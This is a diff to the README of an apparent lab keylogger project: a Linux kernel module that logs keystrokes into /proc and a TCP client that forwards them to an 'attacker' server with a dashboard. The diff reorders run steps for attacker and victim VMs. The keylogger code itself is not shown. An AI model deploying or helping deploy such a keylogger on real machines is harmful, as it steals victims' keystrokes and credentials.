@@ -4,26 +4,29 @@ A Linux kernel module that logs keystrokes into `/proc`, a TCP client that forwa
 
 ## Build
 
-### Attacker (server)
+## Run: one attacker VM + multiple victim VMs
+
+### Attacker VM (server)
+
+Terminal one:
 
 ```bash
 ./out/server
+```
+
+Terminal two:
+
+```bash
+python3 dashboard.py
 ```
 
 ---
 
-## Run: one attacker VM + multiple victim VMs
-
-### On attacker VM
-
-```bash
-./out/server
-```
-
 ### On each victim VM
 
 ```bash
-./klrun.ko
+./klinstall.sh
+./klservice.sh
 ```
 
 For each connected victim, the server will create a unique log file with their keystrokes.
@@ -33,7 +36,7 @@ For each connected victim, the server will create a unique log file with their k
 On each victim:
 
 ```bash
-./klstop.ko
+./kluninstall
 ```
 
 Stop the server with `Ctrl+C` on the attacker.
